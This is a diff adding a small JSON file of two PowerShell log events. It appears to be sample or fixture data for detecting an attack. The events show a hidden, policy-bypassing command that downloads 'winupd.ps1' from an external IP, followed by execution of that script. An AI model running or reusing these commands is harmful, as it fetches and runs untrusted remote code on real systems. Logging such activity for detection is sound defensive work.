@@ -1,0 +1,16 @@
+[
+  {
+    "event_time": "2026-01-26T06:08:41.000Z",
+    "event_name": "PowerShellExecution",
+    "user": "r.kuznetsov",
+    "source_ip": "10.3.80.44",
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command Invoke-WebRequest http://91.214.88.109/winupd.ps1 -OutFile C:\\ProgramData\\winupd.ps1"
+  },
+  {
+    "event_time": "2026-01-26T06:11:02.000Z",
+    "event_name": "PowerShellExecution",
+    "user": "r.kuznetsov",
+    "source_ip": "10.3.80.44",
+    "scriptblock": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\ProgramData\\winupd.ps1"
+  }
+]
